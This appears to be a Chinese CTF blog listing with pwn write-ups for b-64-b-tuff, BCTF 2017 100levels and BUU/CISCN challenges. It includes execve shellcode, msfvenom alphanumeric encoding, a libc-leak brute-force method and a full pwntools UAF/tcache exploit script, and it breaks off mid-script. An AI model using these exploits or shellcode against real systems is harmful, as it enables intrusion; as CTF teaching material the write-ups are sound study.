<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">text:0804879C var_18          = dword ptr -18h</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555021.jpeg" alt="img"></p>
<p>3.所以我们输入的内容就成了会被执行的汇编代码，也就是可以输入Shellcode，来执行我们需要的命令。这里可以看一个连接网址，从里面找shellcode：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >http://shell-storm.org/shellcode/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找，这里直接给出一个可用的shellcode:</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555344.jpeg" alt="img"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><br></pre></td></tr></table></div></figure>

<p>4.但是有Base64_encode，所以我们输入的需要会被base64编码，而base64编码只能由只由0-9，a-z，A-Z，+，/这些字符组成，(这里就是对应的ascii转换表中内容)所以常规的shellcode就不合格，我们这里选中的shellcode中某些字符就没办法被base64编码，所以这里需要用到msfvenom来选择一个可用的编码器，将我们常规的shellcode编码成可以被base64编码的shellcode。</p>
<p>5.打开Linux，输入msfvenom -l encoders可以查看编码器，后面有介绍，可以看一下，从中选择一个可用的编码器对shellcode进行编码即可。</p>
<p>6.查到x86/alpha_mixed这个编码器可以将我们输入的shellcode编码成大小写混合的代码，符合条件。</p>
<p>x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder</p>
<p>运行编码器的代码如下：</p>
<p>python -c ‘import sys; sys.stdout.write(“\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80”)’ | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 –platform linux BufferRegister=EAX -o payload</p>
<p>7.输入这段代码运行之后可以看到当前文件夹目录下生成了一个payload文件，文本打开就可以看到编码后的shellcode:</p>
<p>PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA</p>
<p>8.之后需要将这段可以被Base64编码的进行Base64解码，得到的shellcode再被程序中的Base64编码后才是我们真正起作用的shellcode。利用python脚本即可。</p>
<p>▲</p>
<p>1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。</p>
<p>2.由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。</p>
<p>3.此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。</p>
<p>4.由于在b-64-b-tuff中是通过指令call eax调用shellcode的eax,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。这段shellcode代码就可以被base64编码成我们需要的汇编代码。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/BCTF%202017-100levels/">BCTF 2017-100levels</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开启了NX和PIE，不能shellcode和简单rop。之后IDA打开找漏洞，E43函数中存在栈溢出漏洞：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">--------------------------------------------------</span><br><span class="line">read(0, &amp;buf, 0x400uLL);</span><br></pre></td></tr></table></div></figure>

<p>有栈溢出那么首先想到是应该查看有没有后门，但是这个程序虽然外部引用了system函数，但是本身里并没有导入到.got.plt表中，没办法直接通过.got.plt来寻址。而且开了PIE，就算导入到.got.plt表中，也需要覆盖返回地址并且爆破倒数第四位才能跳转到system函数。虽然有栈溢出，但是没有后门函数，同样也没办法泄露Libc地址。</p>
<p>2.想getshell，又只有一个栈溢出，没有其它漏洞，还开了PIE和NX，那么一定得泄露出地址才能做，而printf地址也因为PIE没办法直接跳转。陷入卡顿，但是这里可以查看E43函数中的printf的汇编代码：</p>
<p>只能通过栈溢出形式来为下一次的printf赋参数来泄露。又由于PIE，也不知道任意一个函数的代码地址，那也没办法泄露被加载进入Libc中的内存地址。</p>
<p>3.通过调试可以看到，进入E43函数中，抵达printf函数时，栈顶的上方有大量的指向libc的地址：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532908.png" alt="img"></p>
<p>并且观察E43函数中的汇编代码，可以看到Printf是通过rbp取值的，那么我们可以通过栈溢出修改rbp来使得[rbp+var_34]落在其它地方，而如果这个其它地方有libc地址，那么就相当于泄露出了Libc地址。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532014.jpeg" alt="img"></p>
<p>4.这个关卡数是由我们设置的，而且通过递归调用E43函数，形成多个E43的栈，那么进行调试，第二次进入E43的栈之后，仍然在运行到printf函数时，栈顶上方仍旧有大量的Libc地址。由于我们需要修改rbp来使得下一次的printf打印出libc地址，那么关卡最低需要设置两关，第一关用来栈溢出，修改rbp，使得第二关中的printf函数指向栈顶上方从而打印出Libc地址。</p>
<p>5.由于栈的随机化，我们如果随意修改rbp那么就会打印出奇怪的东西，所以修改rbp的最后一个字节，使得[rbp+var_34]能够移动一定范围，以一定几率命中栈顶上方。而又由于是递归调用，第一关的栈在第二关的栈的上方，模型大致如下：</p>
<p>(1)第一次rbp和rsp以及第二次的如图：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532743.png" alt="img">  <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532872.png" alt="img"></p>
<p>(2)第一次栈以及第二次栈如图：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532846.png" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532270.png" alt="img"></p>
<p>▲这里用的是Libc-2.32的，用其他的Libc就不太一样，具体情况具体分析。</p>
<p>6.这里的模型是假设第一次的rsp栈顶后两位为00，但是由于栈地址随机化，所以rsp其实可以从0x00-0xFF之间变化，对应的地址也就是从0-31之间变化。</p>
<p>7.这里先考虑第一个问题，rbp-var34如何落到libc空间中，也就是当0往下移动，变化为大约是4或者5时，即可落到libc空间。同样的，从5-16变化，都可以使得rbp-var34落在libc空间。但是如果0变化成16以上，对应的第二次栈空间rbp就会变成32以上，换算成16进制为0x100，这时修改最后两位，就会变成0x15c，使得它不但不往上走，更会往下走，从而没办法落到libc空间。总而言之，慢慢研究下，然后计算概率大约为12/32=3/8，可以使得落在Libc空间。这里的5c可以改变成其它值x，但是需要x-0x34为8的倍数才行，不然取到的地址会是截断的，但是修改后成功概率会发生改变，因为0x5c扫到的地址范围大概就是libc的栈空间。</p>
<p>8.落在libc空间不代表一定就会落在指向Libc地址上，前面可以看到，在16个地址范围内大概为7个，也就是1/2的概率成功。然后由于有v2%a1这个运算，也就对应汇编代码idiv   [rbp+var_34]，这就导致如果rbp+var_34的数据为0那么就会产生除零操作，这里没办法去掉。需要进行try操作来去除这个错误，使程序重新运行，进行自动化爆破。同时泄露出来的地址会发现有时候是正数有时候是负数。这是因为我们只能泄露出地址的低32位，低8个十六进制数。而这个数的最高位可能是0或者1，转换成有符号整数就可能是正负两种情况。这里进行处理可避免成功率下降：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if addr_l8 &lt; 0:</span><br><span class="line">addr_l8 = addr_l8 + 0x100000000</span><br></pre></td></tr></table></div></figure>

<p>9.但是泄露出来的地址由于printf的参数是%d，所以打印出来的是32位地址，还需要猜剩下32位。但是这里有个技巧，貌似所有64程序加载后的代码段地址都在0x000055XXXXXXXXXX-0x000056XXXXXXXXXX之间徘徊，对应的libc加载段在0x00007EXXXXXXXXXX-0x00007FXXXXXXXXXX范围，以下是测试数据：</p>
<p>程序开头段.load首地址和debug段首地址：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">00007F1301D2A000  </span><br><span class="line">000056238FCAB000</span><br><span class="line">差值为28EF 7207 F000</span><br><span class="line"></span><br><span class="line">00007FCB31061000</span><br><span class="line">000055D513E06000</span><br><span class="line">差值为29F6 1D25 B000</span><br><span class="line"></span><br><span class="line">00007F58EFF09000</span><br><span class="line">000055F7C1BEC000</span><br><span class="line">差值为2983 DC10 3000</span><br></pre></td></tr></table></div></figure>

<p>具体原理好像是PIE源代码随机的关系，但具体不太清楚，能用就行。所以高32位就可以假设地址为0x00007fxx，所以这里需要爆破0x1ff大小，也就是511，相当于512次，但是其实可以知道，大概率是落在0x7f里，看数据分析也可以知道，所以实际爆破次数基本在500次以内。所以将泄露出来的地址加上一个在0x7f里的值，也就是addr = addr_l8 + 0x7f8b00000000，之后再根据Libc空间中指向libc地址的后两位来区分地址：并减去在libc中查到的偏移量即可得到Libc基地址。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if hex(addr)[-2:] == &#x27;0b&#x27;: #__IO_file_overflow+EB</span><br><span class="line">libc_base = addr - 0x7c90b</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;d2&#x27;: #puts+1B2</span><br><span class="line">libc_base = addr - 0x70ad2</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-3:] == &#x27;600&#x27;:#_IO_2_1_stdout_</span><br><span class="line">libc_base = addr - 0x3c2600</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-3:] == &#x27;400&#x27;:#_IO_file_jumps</span><br><span class="line">libc_base = addr - 0x3be400</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;83&#x27;: #_IO_2_1_stdout_+83</span><br><span class="line">libc_base = addr - 0x3c2683</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;32&#x27;: #_IO_do_write+C2</span><br><span class="line">libc_base = addr - 0x7c370 - 0xc2</span><br><span class="line"></span><br><span class="line">elif hex(addr)[-2:] == &#x27;e7&#x27;: #_IO_do_write+37</span><br><span class="line">libc_base = addr - 0x7c370 - 0x37</span><br></pre></td></tr></table></div></figure>

<p>所以算上命中概率，其实调试的时候可以看到，第一关的栈空间中由于程序运行结果也会有几个指向Libc地址，加上这几个也可以提高成功率，因为修改的rbp也是有可能落在第一关的栈空间。总的爆破次数应该就是500/((1/2)*(3/8))，约为2500次，还能接受。</p>
<p>10.泄露出Libc地址之后一般就有两种方法，一种是利用栈溢出，调用万能gadget用system函数进行binsh字符串赋值，从而getshell。还有一种就是，利用one_gadget来getshell，通过查看E43返回时的汇编代码有一个move eax,0；满足libc-2.23.so的其中一个one_gadget的条件，那么直接用就行。</p>
<p>11.最后libc基地址加上one_gadget的偏移地址就可以得到one_gadget的实际地址。</p>
<p>one_gadget = libc_base + 0x45526</p>
<p>之后在第二关中再次进行栈溢出覆盖rip来跳转到one_gadget即可getshell。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/CISCN-BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/">CISCN-BUU刷题记录2</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.ciscn_2019_es_1：UAF，tcache dup，比较常规，泄露地址，打free_hook。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_es_1&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;27956&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;choice:&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, con, call</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;compary&#x27;s name\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;name:\n&quot;</span>, con)</span><br><span class="line">    sla(<span class="string">&quot;compary call:\n&quot;</span>, <span class="built_in">str</span>(call))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#main_arena_off = 0x3ebc40</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&quot;A&quot;</span>,<span class="number">123</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;B&quot;</span>,<span class="number">123</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x08</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">123</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>,malloc_hook)</span><br><span class="line">libc_base = malloc_hook - obj.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">free_hook = libc_base + obj.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(free_hook),<span class="number">123</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x18</span>,p64(system_addr),<span class="number">123</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>,p64(system_addr),<span class="number">123</span>) <span class="comment">#5</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>2.ciscn_s_9：这题有点意思，栈溢出长度比较短，但是还是够用来泄露地址然后ret2libc。除此之外题目中给了一个hint，可以直接借用jump esp这个gadget来手写shellcode，拉动esp上移到我们输入位置，这样就不再需要考虑到劫持ebp上挪之后的函数剩下的汇编代码。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_s_9&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = 